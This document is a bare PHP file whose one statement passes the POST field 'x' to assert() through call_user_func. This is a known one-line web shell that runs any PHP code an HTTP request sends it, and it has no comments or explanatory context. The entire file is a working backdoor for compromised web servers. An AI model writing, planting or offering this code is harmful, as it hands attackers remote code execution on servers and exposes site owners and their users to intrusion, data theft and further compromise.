<?php
    call_user_func('assert',$_POST['x']);
?>
